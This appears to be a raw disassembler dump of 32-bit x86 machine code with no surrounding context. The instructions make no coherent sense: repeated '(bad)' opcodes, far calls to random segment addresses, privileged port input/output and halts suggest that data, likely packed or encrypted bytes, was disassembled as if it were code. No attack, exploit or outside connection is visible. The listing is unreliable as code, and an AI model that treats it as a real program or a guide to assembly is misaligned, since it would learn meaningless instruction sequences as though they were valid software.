  432b11:	dec    ebx
  432b12:	jle    0x432aaa
  432b14:	mov    esp,0xde739900
  432b19:	gs push cs
  432b1b:	fmul   QWORD PTR [eax]
  432b1d:	lock push ebp
  432b1f:	aaa    
  432b20:	stos   BYTE PTR es:[edi],al
  432b21:	aas    
  432b22:	xlat   BYTE PTR ds:[ebx]
  432b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432b24:	(bad)  
  432b25:	repnz mov bh,0x44
  432b28:	ja     0x432aaf
  432b2a:	jg     0x432b27
  432b2c:	mov    bl,0xb4
  432b2e:	cmp    DWORD PTR [ebx],0x8e46b148
  432b34:	outs   dx,BYTE PTR ds:[esi]
  432b35:	mov    ebp,0x5d9ffff
  432b3a:	call   0x4b72:0x11d952fa
  432b41:	sbb    BYTE PTR [edx+0x339fa2ca],0x80
  432b48:	sub    ch,ch
  432b4a:	add    al,0xa4
  432b4c:	or     BYTE PTR [edx+edi*8+0x6add3889],0x5f
  432b54:	enter  0x9d02,0x83
  432b58:	popf   
  432b59:	addr16 and eax,0x1ae22b5
  432b5f:	push   0x53
  432b61:	or     esi,ecx
  432b63:	jp     0x432b57
  432b65:	jne    0x432aea
  432b67:	mov    es,WORD PTR [edx]
  432b69:	mov    al,0x7c
  432b6b:	mov    bl,0xb2
  432b6d:	repnz mov WORD PTR [esi],?
  432b70:	loopne 0x432be9
  432b72:	clc    
  432b73:	jne    0x432b62
  432b75:	or     edx,DWORD PTR [ecx+0x7905d481]
  432b7b:	repnz (bad) 
  432b7d:	push   ebx
  432b7e:	sahf   
  432b7f:	stc    
  432b80:	fbld   TBYTE PTR [ecx-0x408d3056]
  432b86:	mov    ds:0xf90be93f,al
  432b8b:	in     al,0xbd
  432b8d:	imul   edi,DWORD PTR [ebx-0x48],0x669be563
  432b94:	xchg   ebx,eax
  432b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432b96:	push   es
  432b97:	cmp    DWORD PTR [ecx-0x5],esi
  432b9a:	outs   dx,BYTE PTR ds:[esi]
  432b9b:	xchg   ebx,eax
  432b9c:	xchg   DWORD PTR [ebx+0x42],edx
  432b9f:	xchg   edx,eax
  432ba0:	mov    dl,0xa
  432ba2:	cmp    dh,0xbf
  432ba5:	call   0x739a:0xfd42d1cc
  432bac:	sub    eax,0xb68db125
  432bb1:	out    dx,al
  432bb2:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  432bb4:	push   0xe97f16e2
  432bb9:	test   ebx,eax
  432bbb:	xor    eax,0xce6afebd
  432bc0:	fisttp WORD PTR [ebx+0x51410e01]
  432bc6:	fwait
  432bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432bc8:	jo     0x432c41
  432bca:	jg     0x432b82
  432bcc:	in     eax,0xa5
  432bce:	in     eax,dx
  432bcf:	xor    DWORD PTR [edx-0x2fd08b66],esi
  432bd5:	sub    DWORD PTR [edi+0x74],ebx
  432bd8:	fldl2t 
  432bda:	mov    dh,0xd3
  432bdc:	hlt    
  432bdd:	std    
  432bde:	jecxz  0x432b7a
  432be0:	out    dx,eax
  432be1:	pop    ebp
  432be2:	call   0x69e8:0x27f0eb70
  432be9:	jnp    0x432b90
  432beb:	leave  
  432bec:	xchg   edx,eax
  432bed:	mov    ebp,DWORD PTR [ebp+0x5b]
  432bf0:	mov    ebp,0x7180a8cb
  432bf5:	or     esp,DWORD PTR [eax+0x1e]
  432bf8:	cmp    edi,DWORD PTR [edx+0x6d519a85]
  432bfe:	ins    BYTE PTR es:[edi],dx
  432bff:	sub    DWORD PTR [ebp+edi*2-0x6ecdf4d1],0xc6a211da
  432c0a:	or     BYTE PTR [ebx-0x58a38cd1],bh
  432c10:	mov    WORD PTR [ecx-0x6b],es
  432c13:	jmp    0xc165bb9f
  432c18:	mov    dl,0x17
  432c1a:	push   eax
  432c1b:	push   edx
  432c1c:	outs   dx,BYTE PTR ds:[esi]
  432c1d:	cmp    esi,ecx
  432c1f:	cmp    dl,BYTE PTR [esi+0x714b520b]
  432c25:	cmp    al,0x2b
  432c27:	shl    BYTE PTR [edi+0x6c],cl
  432c2a:	call   0xf68a:0x17c2e1fa
  432c31:	lods   al,BYTE PTR ds:[esi]
  432c32:	add    esp,DWORD PTR [edi+0x45dddadc]
  432c38:	add    edx,eax
  432c3a:	seto   BYTE PTR [eax+0x2805eb2b]
  432c41:	jnp    0x432ca5
  432c43:	sub    eax,0xbf996212
  432c48:	aam    0xe9
  432c4a:	sbb    DWORD PTR [edi],esi
  432c4c:	imul   ebp,DWORD PTR [ebx+0x60],0xffffffa4
  432c50:	dec    ebp
  432c51:	cmp    DWORD PTR [edi+0x2a48e5fc],ebx
  432c57:	dec    esp
  432c58:	stos   DWORD PTR es:[edi],eax
  432c59:	sbb    bl,BYTE PTR [ebx+0x7aaeddb]
  432c5f:	or     eax,0x4b666885
  432c64:	test   eax,0x316ed62d
  432c69:	or     eax,edi
  432c6b:	mov    ch,0x5a
  432c6d:	pop    edx
  432c6e:	outs   dx,BYTE PTR ds:[esi]
  432c6f:	dec    esp
  432c70:	lea    edi,[ebp+0x455439a7]
  432c76:	(bad)  
  432c77:	(bad)  [edx+0x26]
  432c7a:	aas    
  432c7b:	xchg   esp,eax
  432c7c:	pusha  
  432c7d:	sbb    BYTE PTR [edi+eiz*4-0x2cf3d658],0x37
  432c85:	in     al,dx
  432c86:	and    DWORD PTR [esi-0x51],ecx
  432c89:	xor    DWORD PTR [esi],ebp
  432c8b:	(bad)  
  432c8c:	repnz (bad) 
  432c8e:	mov    ecx,0xd0c43650
  432c93:	dec    edi
  432c94:	jns    0x432ca1
  432c96:	cld    
  432c97:	push   cs
  432c98:	dec    ecx
  432c99:	fcom   DWORD PTR [edi]
  432c9b:	mov    cl,0x95
  432c9d:	loop   0x432c39
  432c9f:	aaa    
  432ca0:	into   
  432ca1:	mov    bl,0x13
  432ca3:	cmp    esi,esi
  432ca5:	imul   edi,DWORD PTR ds:0x9a5eca9a,0x57
  432cac:	jge    0x432cad
  432cae:	pop    ds
  432caf:	test   BYTE PTR [ebx+0xe129d75],ah
  432cb5:	test   al,0x85
  432cb7:	adc    eax,0x90eef1d2
  432cbc:	mov    ecx,0x5241380b
  432cc1:	inc    edi
  432cc2:	out    0x3f,eax
  432cc4:	sub    al,0x21
  432cc6:	call   0x8a8:0x96f9430f
  432ccd:	cwde   
  432cce:	cmc    
  432ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432cd0:	mov    edx,0x9532ef15
  432cd5:	(bad)  
  432cd6:	hlt    
  432cd7:	test   BYTE PTR [edx+0x7e7e878c],dh
  432cdd:	loopne 0x432c91
  432cdf:	aaa    
  432ce0:	outs   dx,BYTE PTR ds:[esi]
  432ce1:	add    eax,0xfd33af36
  432ce6:	xchg   esp,eax
  432ce7:	dec    edi
  432ce8:	rol    BYTE PTR [edi+0x4297f405],cl
  432cee:	call   0x6d37:0x929ce58
  432cf5:	mov    dl,BYTE PTR [edi+eiz*4+0x65078076]
  432cfc:	adc    eax,0x4fba4edd
  432d01:	fcmovnbe st,st(2)
  432d03:	push   esi
  432d04:	mov    dl,0x44
  432d06:	jns    0x432d0b
  432d08:	imul   esp,DWORD PTR [esi-0x14],0x23
  432d0c:	int3   
  432d0d:	jle    0x432d16
  432d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d10:	xchg   esi,eax
  432d11:	scas   al,BYTE PTR es:[edi]
  432d12:	xchg   esp,eax
  432d13:	js     0x432cd7
  432d15:	sti    
  432d16:	sub    BYTE PTR [ebp+0x29566db3],dl
  432d1c:	(bad)  
  432d1d:	ds in  eax,dx
  432d1f:	dec    ecx
  432d20:	dec    esi
  432d21:	cmc    
  432d22:	mov    BYTE PTR [edi-0x1348bc4d],ah
  432d28:	neg    BYTE PTR [edi+eax*1-0x280b69eb]
  432d2f:	nop
  432d30:	mov    dl,0x35
  432d32:	add    ch,cl
  432d34:	(bad)  
  432d35:	fucomip st,st(6)
  432d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d38:	or     BYTE PTR [edi],bh
  432d3a:	push   ds
  432d3b:	sub    ecx,DWORD PTR [ebp-0x4d0c00a9]
  432d41:	mov    ebx,ebp
  432d43:	es inc esi
  432d45:	aad    0xa
  432d47:	and    BYTE PTR [eax+0x5],al
  432d4a:	shr    DWORD PTR [eax+0x281a1006],cl
  432d50:	out    dx,eax
  432d51:	stos   BYTE PTR es:[edi],al
  432d52:	ins    DWORD PTR es:[edi],dx
  432d53:	int3   
  432d54:	mov    dl,0xb0
  432d56:	sub    bl,0x5e
  432d59:	mov    eax,0x31531008
  432d5e:	adc    esp,0xffffffa4
  432d61:	xchg   ebp,eax
  432d62:	loopne 0x432d0b
  432d64:	adc    eax,0x338ac7b5
  432d69:	dec    edx
  432d6a:	xchg   ebp,eax
  432d6b:	mov    bl,0xfb
  432d6d:	repz xchg esp,eax
  432d6f:	in     al,dx
  432d70:	pop    ss
  432d71:	mov    dh,al
  432d73:	adc    BYTE PTR [esi-0x55],cl
  432d76:	mov    dl,0xc8
  432d78:	adc    al,0xb
  432d7a:	sub    BYTE PTR [edx+0x27],bl
  432d7d:	add    BYTE PTR [esi+ebx*1-0x52],ah
  432d81:	jecxz  0x432d1d
  432d83:	cwde   
  432d84:	jmp    0x432d6f
  432d86:	jnp    0x432d08
  432d88:	and    DWORD PTR [ebp*2+0x2daa7aa7],ebx
  432d8f:	xchg   BYTE PTR [eax-0x46a746d2],bh
  432d95:	nop
  432d96:	sbb    esi,DWORD PTR [ebx]
  432d98:	mov    cl,0x8b
  432d9a:	add    BYTE PTR [ecx+0x5fdad1fe],0xad
  432da1:	inc    DWORD PTR [ecx+0x7ab3e1ac]
  432da7:	(bad)  [edx-0x643ff9d6]
  432dad:	xchg   ebp,eax
  432dae:	sub    dh,BYTE PTR [ebx+0x7bec72b2]
  432db4:	shl    ecx,cl
  432db6:	mov    ebp,0xb00b495e
  432dbb:	xchg   edi,eax
  432dbc:	popa   
  432dbd:	in     eax,0x10
  432dbf:	cmp    BYTE PTR [ecx],ch
  432dc1:	cmp    DWORD PTR [edx-0x65],esp
  432dc4:	mov    dl,0x5
  432dc6:	push   ecx
  432dc7:	ret    0xefa9
  432dca:	fiadd  DWORD PTR [edi]
  432dcc:	dec    edx
  432dcd:	or     edx,DWORD PTR [eax+0xf5ce7ed]
  432dd3:	xchg   edi,eax
  432dd4:	rcl    BYTE PTR [eax-0x66],1
  432dd7:	pop    ebp
  432dd8:	jae    0x432df8
  432dda:	xchg   esi,eax
  432ddb:	fwait
  432ddc:	mov    ch,0x3
  432dde:	dec    eax
  432ddf:	pop    ebx
  432de0:	push   esi
  432de1:	or     edx,DWORD PTR [ebx]
  432de3:	push   ecx
  432de4:	rcr    DWORD PTR [esi+0x6ded4803],1
  432dea:	popf   
  432deb:	out    0x21,al
  432ded:	dec    ecx
  432dee:	sbb    ebp,DWORD PTR [edi-0x7b]
  432df1:	sub    bl,dl
  432df3:	mov    al,0xaf
  432df5:	test   BYTE PTR [edx+0x51],ah
  432df8:	lea    ecx,[ebx]
  432dfa:	mov    esi,0x1060bc17
  432dff:	xchg   ebx,eax
  432e00:	das    
  432e01:	cdq    
  432e02:	call   0x251b:0x54c2aa14
  432e09:	dec    ecx
  432e0a:	and    BYTE PTR [ecx-0x47],cl
  432e0d:	or     esp,DWORD PTR [ebx-0x3f]
  432e10:	and    al,0x83
  432e12:	popf   
  432e13:	push   es
  432e14:	not    cl
  432e16:	test   DWORD PTR ds:0xf05b8289,ecx
  432e1c:	add    BYTE PTR [edx+0x1e],al
  432e1f:	fimul  DWORD PTR [esi-0x1f]
  432e22:	sbb    al,0x59
  432e24:	int    0xb
  432e26:	xchg   edi,eax
  432e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e28:	arpl   WORD PTR [ebx+0x33],ax
  432e2b:	fld    TBYTE PTR [esi]
  432e2d:	repz call 0x749b:0x5bab25cc
  432e35:	mov    ecx,0x6f28a77e
  432e3a:	sub    esp,ebx
  432e3c:	jg     0x432e7b
  432e3e:	inc    esp
  432e3f:	jge    0x432dd0
  432e41:	stos   BYTE PTR es:[edi],al
  432e42:	jl     0x432e6d
  432e44:	repz popw es
  432e47:	inc    edi
  432e48:	ja     0x432df6
  432e4a:	push   esi
  432e4b:	test   eax,0x12ef08d8
  432e50:	add    BYTE PTR ds:0x5562a224,ah
  432e56:	mov    eax,0x491046b2
  432e5c:	push   ds
  432e5d:	jb     0x432e53
  432e5f:	in     eax,dx
  432e60:	xor    BYTE PTR [eax],0xfb
  432e63:	jge    0x432e98
  432e65:	iret   
  432e66:	and    ebp,DWORD PTR [eax]
  432e68:	iret   
  432e69:	bndstx [ebx-0x4d],bnd0
  432e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432e6e:	call   0xb8bd:0xc697a0c0
  432e75:	mov    bh,0xb8
  432e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e78:	sahf   
  432e79:	mov    ebp,esp
  432e7b:	inc    eax
  432e7c:	enter  0xfa9c,0x25
  432e80:	popf   
  432e81:	in     eax,dx
  432e82:	or     cl,BYTE PTR [edx-0x36accc4e]
  432e88:	hlt    
  432e89:	and    ch,ch
  432e8b:	ds push ecx
  432e8d:	std    
  432e8e:	retf   
  432e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432e90:	jge    0x432eb0
  432e92:	dec    ebx
  432e93:	cdq    
  432e94:	(bad)  
  432e95:	bound  edi,QWORD PTR [eax-0x69]
  432e98:	cmp    BYTE PTR [eax+0x9],0x11
  432e9c:	push   0x2081fbbc
  432ea1:	jno    0x432e5f
  432ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432ea4:	test   al,0x14
  432ea6:	or     edi,DWORD PTR [ebx]
  432ea8:	inc    ecx
  432ea9:	adc    DWORD PTR [ebp+0x37086fe6],0x9
  432eb0:	test   DWORD PTR [edx-0x266e59b3],ecx
  432eb6:	jle    0x432e5d
  432eb8:	jbe    0x432f38
  432eba:	adc    al,0xa7
  432ebc:	sub    al,0x35
  432ebe:	jbe    0x432f1a
  432ec0:	mov    bh,0xbe
  432ec2:	repnz push esi
  432ec4:	pop    edx
  432ec5:	pop    edx
  432ec6:	test   DWORD PTR [esi],esp
  432ec8:	icebp  
  432ec9:	mov    al,0x5a
  432ecb:	out    0x4c,al
  432ecd:	and    eax,ebx
  432ecf:	mov    bh,0xd9
  432ed1:	push   ss
  432ed2:	xchg   esi,eax
  432ed3:	or     BYTE PTR [eax-0x734f1335],dl
  432ed9:	repz jg 0x432e8d
  432edc:	mov    dl,0x99
  432ede:	fild   WORD PTR ds:0x1e1ea5b1
  432ee4:	mov    BYTE PTR [ebx],cl
  432ee6:	retf   0x8f12
  432ee9:	mov    WORD PTR ds:0x9aecb534,cs
  432eef:	retf   0x179c
  432ef2:	in     al,0xe7
  432ef4:	popf   
  432ef5:	mov    bl,0xc6
  432ef7:	test   al,0xf1
  432ef9:	inc    esi
  432efa:	push   esp
  432efb:	mov    cl,0x12
  432efd:	push   0x97257ad6
  432f02:	call   0xc7df:0xc145cd9a
  432f09:	and    BYTE PTR [esi-0x4c719558],cl
  432f0f:	pop    edx
  432f10:	(bad)
  432f14:	sbb    eax,0xb4b46a1e
  432f19:	jp     0x432eb5
  432f1b:	repnz xor BYTE PTR [ecx],bh
  432f1e:	cs hlt 
  432f20:	stos   BYTE PTR es:[edi],al
  432f21:	ja     0x432f62
  432f23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432f24:	push   ds
  432f25:	pushf  
  432f26:	jg     0x432f8b
  432f28:	int    0x31
  432f2a:	stc    
  432f2b:	xchg   BYTE PTR [edx-0x689ac661],dh
  432f31:	lea    edx,[edx+0x450b0909]
  432f37:	clc    
  432f38:	mov    ch,0x2b
  432f3a:	cmc    
  432f3b:	inc    ebp
  432f3c:	add    al,al
  432f3e:	call   0xb097:0xd5f70ebb
  432f45:	mov    dl,0xd0
  432f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432f48:	sub    DWORD PTR [ecx-0x56badde8],edx
  432f4e:	ret    0xb959
  432f51:	jnp    0x432f6e
  432f53:	or     eax,0x3a4d8b52
  432f58:	sub    al,0x64
  432f5a:	jl     0x432f00
  432f5c:	mov    al,0x2b
  432f5e:	cmp    eax,edx
  432f60:	adc    eax,0x7e8132cc
  432f65:	pop    ecx
  432f66:	cdq    
  432f67:	(bad)  
  432f68:	imul   esp,DWORD PTR [edx],0x8f2b9be
  432f6e:	mov    BYTE PTR [edi+ecx*1],0xde
  432f72:	xor    BYTE PTR [ecx+0x22620942],bl
  432f78:	mov    dl,0x6
  432f7a:	mov    BYTE PTR [edi-0x6518b2a3],cl
  432f80:	fmul   QWORD PTR [ebx]
  432f82:	xchg   edx,eax
  432f83:	xchg   ecx,eax
  432f84:	clc    
  432f85:	sbb    dl,cl
  432f87:	dec    edi
  432f88:	sub    edi,DWORD PTR [ebx+ebx*4-0x74]
  432f8c:	jle    0x432ffd
  432f8e:	xchg   ebp,eax
  432f8f:	cmp    BYTE PTR [ecx+0x7d],dh
  432f92:	bound  ecx,QWORD PTR [esi+0x2f940aec]
  432f98:	inc    edi
  432f99:	adc    al,BYTE PTR [esi+0x5e]
  432f9c:	ds jecxz 0x432f4e
  432f9f:	jmp    DWORD PTR [esp+eiz*2-0x544de360]
  432fa6:	jg     0x432f2e
  432fa8:	arpl   si,ax
  432faa:	cmp    eax,0xca897da7
  432faf:	aad    0xd7
  432fb1:	ficomp WORD PTR gs:[eax]
  432fb4:	mov    dl,0x62
  432fb6:	jle    0x432fd8
  432fb8:	add    BYTE PTR [eax],al
  432fba:	xchg   BYTE PTR [eax-0x3a7cf405],ch
  432fc0:	cwde   
  432fc1:	sbb    DWORD PTR [eax+0xf],ecx
  432fc4:	les    ebx,FWORD PTR [ecx-0x6c]
  432fc7:	inc    eax
  432fc8:	mov    bh,0x82
  432fca:	mov    ah,0x47
  432fcc:	fdivp  st(4),st
  432fce:	shl    cl,0xda
  432fd1:	or     ecx,DWORD PTR [esi-0x26fad4f]
  432fd7:	mov    ah,dh
  432fd9:	in     eax,dx
  432fda:	call   0xa69:0x13c03758
  432fe1:	sahf   
  432fe2:	test   al,0xa7
  432fe4:	retf   
  432fe5:	jbe    0x432fd0
  432fe7:	adc    DWORD PTR [edx],esp
  432fe9:	jmp    0x43305a
  432feb:	xor    BYTE PTR [edx-0x2f0c94b0],0xc2
  432ff2:	retf   0x6e63
  432ff5:	or     eax,DWORD PTR [edi]
  432ff7:	into   
  432ff8:	mov    BYTE PTR [bx-0x63],ah
  432ffc:	or     BYTE PTR [edx+0x58af089a],ch
  433002:	cs push esi
  433004:	(bad)  
  433005:	stos   DWORD PTR es:[edi],eax
  433006:	ins    DWORD PTR es:[edi],dx
  433007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433008:	or     DWORD PTR [ecx],0x96ea4115
  43300e:	push   esi
  43300f:	jbe    0x432fd5
  433011:	push   esi
  433012:	call   0xae13:0x8cf6b50d
  433019:	mov    ch,0xf7
  43301b:	mov    eax,0xa76f65e1
  433020:	mov    dl,bh
  433022:	and    edx,esi
  433024:	inc    ebx
  433025:	dec    edi
  433026:	call   0xf2f8:0x3fb77d38
  43302d:	das    
  43302e:	bound  esp,QWORD PTR [edi-0x4c66b214]
  433034:	or     DWORD PTR [esi+0x9b09df7],esp
  43303a:	popf   
  43303b:	xchg   ebp,eax
  43303c:	iret   
  43303d:	mov    dh,BYTE PTR [eax-0x4cadcd0e]
  433043:	inc    edi
  433044:	pop    edi
  433045:	pop    ecx
  433046:	out    0xf2,eax
  433048:	mov    dl,0xb8
  43304a:	adc    al,BYTE PTR ds:0xad1ada26
  433050:	xor    DWORD PTR [ebx],ecx
  433052:	xchg   DWORD PTR [edi-0x1e517306],edx
  433058:	daa    
  433059:	mov    al,ds:0xd78fb09a
  43305e:	pop    edi
  43305f:	fs pop ss
  433061:	push   ebx
  433062:	push   esp
  433063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433064:	cmp    dl,bl
  433066:	push   0x74
  433068:	call   0x5c27:0xb246df70
  43306f:	xor    edx,DWORD PTR [edi+ebp*2]
  433072:	daa    
  433073:	or     ecx,edi
  433075:	or     edx,DWORD PTR [ecx+0x1e7eb0e8]
  43307b:	out    dx,eax
  43307c:	mov    eax,ds:0x96c5b48a
  433081:	inc    ebp
  433082:	cwde   
  433083:	mov    BYTE PTR [edx+eax*4],ch
  433086:	cmp    eax,0x9d3381e7
  43308b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43308c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43308d:	out    0x77,eax
  43308f:	inc    ecx
  433090:	push   cs
  433091:	dec    esi
  433092:	pop    edx
  433093:	rsm    
  433095:	mov    al,ds:0x43bc34ac
  43309a:	push   esi
  43309b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43309c:	pop    ebp
  43309d:	call   0xd0e7:0x1ffd2f4a
  4330a4:	mov    dl,0x5c
  4330a6:	add    eax,0x7d7f8fb4
  4330ab:	pop    ebx
  4330ac:	shl    DWORD PTR ds:0xc097417,0xea
  4330b3:	cmc    
  4330b4:	sti    
  4330b5:	jnp    0x433136
  4330b7:	cwde   
  4330b8:	idiv   DWORD PTR [esi]
  4330ba:	call   0xe0d:0x338471aa
  4330c1:	or     al,0x66
  4330c3:	mov    edx,0xe7066d60
  4330c8:	and    eax,ebp
  4330ca:	push   0x4f
  4330cc:	cmp    bl,BYTE PTR [edi-0x66]
  4330cf:	jno    0x43311c
  4330d1:	push   ss
  4330d2:	fyl2xp1 
  4330d4:	imul   edi,DWORD PTR [ebx],0xf871a95d
  4330da:	push   ecx
  4330db:	add    edx,DWORD PTR [edx-0x80]
  4330de:	add    BYTE PTR [eax+eiz*1],al
  4330e1:	cmp    al,0x9a
  4330e3:	xor    al,0xc
  4330e5:	push   esp
  4330e6:	sub    al,0xdd
  4330e8:	add    eax,0xc1ac01c2
  4330ed:	mov    cl,0x33
  4330ef:	jns    0x4330a3
  4330f1:	and    al,0x2
  4330f3:	inc    esp
  4330f4:	(bad)  [esi+0x5f2b19a]
  4330fa:	loop   0x4330f8
  4330fc:	ss or  al,0x78
  4330ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433100:	mov    eax,0xc31d6f37
  433105:	lods   al,BYTE PTR ds:[esi]
  433106:	in     eax,dx
  433107:	xchg   ecx,eax
  433108:	mov    dl,0x30
  43310a:	jb     0x4330e0
  43310c:	pop    ebp
  43310d:	or     eax,0xb2c5711
  433112:	or     dh,dh
  433114:	pop    es
  433115:	lds    esi,FWORD PTR [esi+eax*4]
  433118:	add    eax,0xb2a6e22e
  43311d:	aas    
  43311e:	sub    DWORD PTR [ebx+0x29],edi
  433121:	int    0x96
  433123:	and    ah,BYTE PTR [edi+0x415ca20b]
  433129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43312a:	cmp    ebp,edx
  43312c:	jns    0x43317c
  43312e:	call   0xe755:0x622b6f52
  433135:	test   BYTE PTR es:[eax+edx*2-0x6fc35fa5],ah
  43313d:	outs   dx,BYTE PTR ds:[esi]
  43313e:	and    cl,BYTE PTR [ecx-0x57]
  433141:	mov    esp,0xbbef209a
  433146:	pop    eax
  433147:	jmp    0x3807889e
  43314c:	daa    
  43314d:	add    eax,0x35dbdbe5
  433152:	sbb    bl,BYTE PTR [esi-0x63d3dec8]
  433158:	mov    dl,0xf5
  43315a:	jno    0x433187
  43315c:	dec    edx
  43315d:	and    cl,BYTE PTR [edi+0x730c2e0b]
  433163:	jg     0x433190
  433165:	pushf  
  433166:	aas    
  433167:	(bad)  
  433168:	call   0x2928:0xb58bbb26
  43316f:	clc    
  433170:	ret    0x7529
  433173:	out    0x27,eax
  433175:	je     0x433143
  433177:	cmp    al,0xdb
  433179:	or     BYTE PTR [ebp-0x72030be4],bl
  43317f:	jge    0x4331aa
  433181:	es pop edx
  433183:	ins    BYTE PTR es:[edi],dx
  433184:	and    BYTE PTR [edi-0x2480b266],ah
  43318a:	adc    edx,DWORD PTR [edx]
  43318c:	mul    BYTE PTR [edx+0x47]
  43318f:	lods   eax,DWORD PTR ds:[esi]
  433190:	dec    ebp
  433191:	pop    es
  433192:	test   DWORD PTR [edx+0x45],esi
  433195:	or     al,0x83
  433197:	ins    DWORD PTR es:[edi],dx
  433198:	mov    cl,0x9b
  43319a:	neg    BYTE PTR [edx+edi*4]
  43319d:	jl     0x433139
  43319f:	mov    ebx,0xda1c7e16
  4331a4:	jge    0x4331e5
  4331a6:	or     al,0xdc
  4331a8:	ror    DWORD PTR [ebx],1
  4331aa:	xchg   esp,ebp
  4331ac:	je     0x4331d1
  4331ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4331af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4331b0:	imul   esi,DWORD PTR [ecx],0x8c59ac9b
  4331b6:	sub    eax,0x4e3ff00f
  4331bb:	sbb    esi,esi
  4331bd:	or     edi,DWORD PTR [esi+0x566eb4ba]
  4331c3:	pop    ds
  4331c4:	inc    esp
  4331c5:	pop    esi
  4331c6:	in     al,0xce
  4331c8:	mov    dl,0xad
  4331ca:	out    dx,eax
  4331cb:	mov    bl,0x64
  4331cd:	(bad)  
  4331ce:	in     eax,dx
  4331cf:	mov    cl,0x29
  4331d1:	push   cs
  4331d2:	fwait
  4331d3:	push   esi
  4331d4:	dec    edi
  4331d5:	pop    ecx
  4331d6:	cmp    DWORD PTR [ebx+edx*8-0x3b],esp
  4331da:	xor    eax,0x9cff2577
  4331df:	fwait
  4331e0:	mov    dl,0x6b
  4331e2:	jmp    0x4331d1
  4331e4:	xchg   DWORD PTR ds:0xa476fea,edx
  4331ea:	dec    edx
  4331eb:	pusha  
  4331ec:	jecxz  0x43322b
  4331ee:	cdq    
  4331ef:	xor    ebp,edi
  4331f1:	jnp    0x433258
  4331f3:	int3   
  4331f4:	mov    dl,0xdf
  4331f6:	push   esp
  4331f7:	pop    ebx
  4331f8:	mov    al,0x55
  4331fa:	dec    ebx
  4331fb:	addr16 popf 
  4331fd:	or     al,0x4d
  4331ff:	js     0x4331e5
  433201:	(bad)  
  433202:	rol    BYTE PTR [edi+0x1ec9e47d],0xb2
  433209:	rol    esi,1
  43320b:	int    0x7
  43320d:	add    edx,0xffffffaf
  433210:	pop    ds
  433211:	xor    al,0x6b
  433213:	xor    BYTE PTR [edx+eiz*8],cl
  433216:	sbb    bl,BYTE PTR [edi+esi*8]
  433219:	or     bh,BYTE PTR [edx]
  43321b:	lods   eax,DWORD PTR ds:[esi]
  43321c:	adc    ebp,DWORD PTR [edi-0x5d]
  43321f:	inc    esp
  433220:	jns    0x4331ad
  433222:	dec    ebp
  433223:	jnp    0x4331f3
  433225:	xor    esp,esp
  433227:	ss mov ch,0x8
  43322a:	icebp  
  43322b:	out    dx,al
  43322c:	xlat   BYTE PTR ds:[ebx]
  43322d:	jge    0x433214
  43322f:	xlat   BYTE PTR ds:[ebx]
  433230:	jb     0x43325a
  433232:	fld    TBYTE PTR [edi-0x5e777f4e]
  433238:	gs and bh,ch
  43323b:	call   0xd97d3dca
  433240:	pop    edx
  433241:	mov    eax,DWORD PTR ds:0x84711396
  433247:	mov    DWORD PTR [ebx-0x5ee0e565],edx
  43324d:	push   es
  43324e:	and    eax,0x359370f9
  433253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433254:	ins    BYTE PTR es:[edi],dx
  433255:	jg     0x433295
  433257:	inc    ebx
  433258:	dec    edx
  433259:	xchg   ebp,eax
  43325a:	enter  0xce93,0xc1
  43325e:	popf   
  43325f:	dec    eax
  433260:	pop    ds
  433261:	stos   DWORD PTR es:[edi],eax
  433262:	iret   
  433263:	push   es
  433264:	xchg   edx,eax
  433265:	outs   dx,BYTE PTR ds:[esi]
  433266:	out    0x6c,al
  433268:	repnz retf 
  43326a:	or     BYTE PTR ds:0x345e6720,bl
  433270:	cmp    al,0x7e
  433273:	inc    ecx
  433274:	(bad)  
  433275:	jnp    0x433275
  433277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433278:	xchg   BYTE PTR [esi],dl
  43327a:	cli    
  43327b:	retf   0x2f6a
  43327e:	sub    edx,DWORD PTR [edi-0x3b652b17]
  433284:	xor    ebx,0x77db0f9c
  43328a:	push   cs
  43328b:	test   eax,0x3186e2c
  433290:	adc    bl,al
  433292:	jmp    0xf2d5:0x94173b5d
  433299:	pop    ebx
  43329a:	or     BYTE PTR [edi],al
  43329c:	pop    ebp
  43329d:	add    al,0x20
  43329f:	sbb    BYTE PTR [esi-0x11],0xf1
  4332a3:	test   al,0xcc
  4332a5:	shl    DWORD PTR [eax],0x7d
  4332a8:	mov    dl,0x33
  4332aa:	push   ebp
  4332ab:	loop   0x43327f
  4332ad:	and    ebx,DWORD PTR [edx-0x5c8d985c]
  4332b3:	push   edi
  4332b4:	ret    
  4332b5:	or     al,0xf
  4332b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4332b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4332b9:	das    
  4332ba:	jbe    0x4332a1
  4332bc:	int3   
  4332bd:	push   0x6d54e49e
  4332c2:	cwde   
  4332c3:	push   ecx
  4332c4:	in     eax,dx
  4332c5:	push   ss
  4332c6:	call   0xbf8ef5f2
  4332cb:	cmp    eax,0xa73c79d8
  4332d0:	rcr    BYTE PTR [esi],1
